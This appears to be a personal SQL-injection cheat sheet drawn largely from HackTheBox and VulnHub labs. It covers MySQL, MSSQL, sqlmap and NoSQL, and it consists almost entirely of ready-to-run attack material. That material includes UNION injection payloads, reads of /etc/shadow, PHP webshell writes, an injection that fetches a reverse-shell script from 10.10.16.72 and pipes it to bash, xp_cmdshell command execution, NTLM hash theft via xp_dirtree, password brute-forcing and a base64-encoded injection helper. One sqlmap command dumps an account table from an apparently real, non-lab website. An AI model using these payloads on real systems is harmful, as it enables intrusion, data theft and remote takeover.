- MySql:
	
	- Enum:
		1" union select null, null, @@hostname, @@version-- - asd
		1" UNION SELECT null,null,null,load_file('/etc/passwd')-- - asd
	
	
	
	- Manual (dc09.vulnhub,)
		Mary' union select null, null, database(), system_user(), @@datadir, @@version -- -asd
		Mary' union SELECT SCHEMA_NAME, null, null, null, null, null FROM information_schema.SCHEMATA-- - #==> show databases
		Mary' union SELECT table_name, null, null, null, null, null FROM information_schema.tables WHERE table_schema='Staff'-- -asd #==> show tables
		Mary' union SELECT column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name='StaffDetails'-- - #==> columns
		
	- Write file:
		- Stack query only:(not success with other yet ???)
			select '<?php echo \"Shell\";system($_GET\[\"cmd\"\]); ?>' into outfile '/var/lib/mysql/webshell123456789.php'; # zipping.htb
			1"; select '<?php echo \"Shell\";system($_GET\[\"cmd\"\]); ?>' into outfile '/var/lib/mysql/webshell123456789.php';-- -insanityhosting.vh
	- Read file:
		select null,null,load_file('/var/lib/mysql-files/key.txt');
		
		DELETE FROM test_db.test;load data local infile "/etc/shadow" into table test_db.test FIELDS TERMINATED BY '\n';select * from test_db.test;
		
		More: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-read-content-of-a-file
	- RCE:
		\! sh
		
	- nice stuff:
		https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/
		mysql -u kali -h localhost mysql -p'kali' --execute='select @verion' 
-MSSql:
	- Enum
		nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 manager.htb
		impacket-mssqlclient manager.htb/test111:@10.10.11.236
		impacket-mssqlclient -windows-auth -no-pass manager.htb/sa@10.10.11.236
	- Bruce password:
		crackmapexec mssql 10.10.11.236 -u MANAGER -p /usr/share/wordlists/rockyou.txt --local-auth 
	- Login
		impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236
	- Directory Listing(Cred-requied):
		impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236 ==> xp_dirtree c:\
	- Write file:
		https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#write-files
	- Read file:
		SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
	- RCE:
		crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
		
		EXEC master..xp_cmdshell 'whoami'
		EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
	- steal ntlmv2(with cred)
		impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236 ==> exec master.dbo.xp_dirtree '\\10.10.16.72\any\thing'

	- UNION(steamio.htb)
		abcd' union select 1,2,(SELECT DB_NAME()),4,5,6 from master..sysdatabases;-- - #==> show all current DB
		abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- - #==> show all DB
		abcd' union select 1,name,3,4,5,6 from steamio..sysobjects;-- - #==> show all tables of database steamio
		abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- - #==> get collums name
	





















----------------------------------------------------------------------SqlMap----------------------------------------------------------------------

sqlmap -l /mnt/c/Users/anhndt/Desktop/chinsu -o --level=5  --risk=3 -b --dbms=PostgreSQL
sqlmap -l /home/kali/stuffs/hacker1/sqli -o --level=5  --risk=3 -b --dbms=mysql -p 'username' --technique 'T' --proxy=http://127.0.0.1:8080 --tamper=charencode.py --batch
ref: https://github.com/thryb/sqlmap-tamper/blob/master/README.md


sqlmap --url 'http://metapress.htb/wp-admin/admin-ajax.php' --data='action=bookingpress_front_get_category_services&_wpnonce=aa95524bbb&category_id=1&total_service=1' --cookie='PHPSESSID=bbh3nao433sisnl9a9lo9am3qm; wordpress_test_cookie=WP%20Cookie%20check' --random-agent -p 'total_service' --dbms=MySQL -o --dump-all --level=5 --risk=3 --proxy=http://192.168.44.1:8080 

sqlmap --url 'http://tainha.medcom.vn/System/listAccountAdd?uid=2925' -p 'uid' --cookie='' --string '0123456789' -o --level=5  --risk=1 --dbms=MSSQL --random-agent --technique 'BS' --threads=1 --dump -D 'Revenue' -T 'cms_Account' --drop-set-cookie

sqlmap -u 'ws://soc-player.soccer.htb:9001' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch -- threads 10 -dbs (soccer.htb)




- Mysql create file(zipping.htb):
	/shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//10.10.16.72:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl{fnb}.php'+%231
	%0A ==>> bypass pregmatch
	select '<?php system(\"curl http://10.10.16.72:8000/revshell.sh|bash\");?>' into outfile '/tmp/rvsl.php'; ==>> -rw-r--r--  1 mysql mysql   65 Jan  1 17:50 rvsl.php
	
	
----------------------------------------------------------------------NoSql----------------------------------------------------------------------
python3 mongomap.py -u http://shoppy.htb/login --method post --data "username=jaeger&password=1"

* Default useful payload:
'; return this; var dum = '


----------------------------------------------------------------------middleware----------------------------------------------------------------------
(soccer.htb)
echo ZnJvbSBodHRwLnNlcnZlciBpbXBvcnQgU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyCmZyb20gc29ja2V0c2VydmVyIGltcG9ydCBUQ1BTZXJ2ZXIKZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHVucXVvdGUsIHVybHBhcnNlCmZyb20gd2Vic29ja2V0IGltcG9ydCBjcmVhdGVfY29ubmVjdGlvbgppbXBvcnQgcmVxdWVzdHMKCgp3c19zZXJ2ZXIgPSAid3M6Ly9zb2MtcGxheWVyLnNvY2Nlci5odGI6OTA5MSIKaHR0cF9zZXJ2ZXIgPSAiaHR0cDovLzEwLjEwLjExLjIyOTo4MCIKCmRlZiBzZW5kX3dzKHBheWxvYWQpOgoJd3MgPSBjcmVhdGVfY29ubmVjdGlvbih3c19zZXJ2ZXIpCgkjIElmIHRoZSBzZXJ2ZXIgcmV0dXJucyBhIHJlc3BvbnNlIG9uIGNvbm5lY3QsIHVzZSBiZWxvdyBsaW5lCQoJI3Jlc3AgPSB3cy5yZWN2KCkgIyBJZiBzZXJ2ZXIgcmV0dXJucyBzb21ldGhpbmcgbGlrZSBhIHRva2VuIG9uIGNvbm5lY3QgeW91IGNhbiBmaW5kIGFuZCBleHRyYWN0IGZyb20gaGVyZQoJCgkjIEZvciBvdXIgY2FzZSwgZm9ybWF0IHRoZSBwYXlsb2FkIGluIEpTT04KCW1lc3NhZ2UgPSB1bnF1b3RlKHBheWxvYWQpLnJlcGxhY2UoJyInLCdcJycpICMgcmVwbGFjaW5nICIgd2l0aCAnIHRvIGF2b2lkIGJyZWFraW5nIEpTT04gc3RydWN0dXJlCglkYXRhID0gJ3siaWQiOiIlcyJ9JyAlIG1lc3NhZ2UKCgl3cy5zZW5kKGRhdGEpCglyZXNwID0gd3MucmVjdigpCgl3cy5jbG9zZSgpCgoJaWYgcmVzcDoKCQlyZXR1cm4gcmVzcAoJZWxzZToKCQlyZXR1cm4gJycKICAgICAgICAKZGVmIHNlbmRfaHR0cGdfZ2V0KHBheWxvYWQpOgoJI3RoaXMgY3JlYXRlIGZvciB6aXBpbmcuaHRiCglxdWVyeSA9ICIvc2hvcC9pbmRleC5waHA/cGFnZT1wcm9kdWN0JmlkPTElMEEiICsgcGF5bG9hZCArICIlMjMxIgoJcmVxID0gcmVxdWVzdHMuZ2V0KGh0dHBfc2VydmVyK3F1ZXJ5KQoJcmV0dXJuIHJlcS5jb250ZW50LmRlY29kZSgidXRmLTgiKQoKZGVmIG1pZGRsZXdhcmVfc2VydmVyKGhvc3RfcG9ydCxjb250ZW50X3R5cGU9InRleHQvcGxhaW4iKToKCgljbGFzcyBDdXN0b21IYW5kbGVyKFNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CgkJZGVmIGRvX0dFVChzZWxmKSAtPiBOb25lOgoJCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCQl0cnk6CgkJCQlwYXlsb2FkID0gdXJscGFyc2Uoc2VsZi5wYXRoKS5xdWVyeS5zcGxpdCgnPScsMSlbMV0KCQkJZXhjZXB0IEluZGV4RXJyb3I6CgkJCQlwYXlsb2FkID0gRmFsc2UKCQkJCQoJCQlpZiBwYXlsb2FkOgoJCQkJI2NvbnRlbnQgPSBzZW5kX3dzKHBheWxvYWQpCgkJCQljb250ZW50ID0gc2VuZF9odHRwZ19nZXQocGF5bG9hZCkKCQkJZWxzZToKCQkJCWNvbnRlbnQgPSAnTm8gcGFyYW1ldGVycyBzcGVjaWZpZWQhJwoKCQkJc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgY29udGVudF90eXBlKQoJCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQkJc2VsZi53ZmlsZS53cml0ZShjb250ZW50LmVuY29kZSgpKQoJCQlyZXR1cm4KCgljbGFzcyBfVENQU2VydmVyKFRDUFNlcnZlcik6CgkJYWxsb3dfcmV1c2VfYWRkcmVzcyA9IFRydWUKCglodHRwZCA9IF9UQ1BTZXJ2ZXIoaG9zdF9wb3J0LCBDdXN0b21IYW5kbGVyKQoJaHR0cGQuc2VydmVfZm9yZXZlcigpCgoKcHJpbnQoIlsrXSBTdGFydGluZyBNaWRkbGVXYXJlIFNlcnZlciIpCnByaW50KCJbK10gU2VuZCBwYXlsb2FkcyBpbiBodHRwOi8vbG9jYWxob3N0OjgwODEvP2lkPSoiKQoKdHJ5OgoJbWlkZGxld2FyZV9zZXJ2ZXIoKCcwLjAuMC4wJyw4MDgxKSkKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJcGFzcwo=|base64 -d > middleware.py


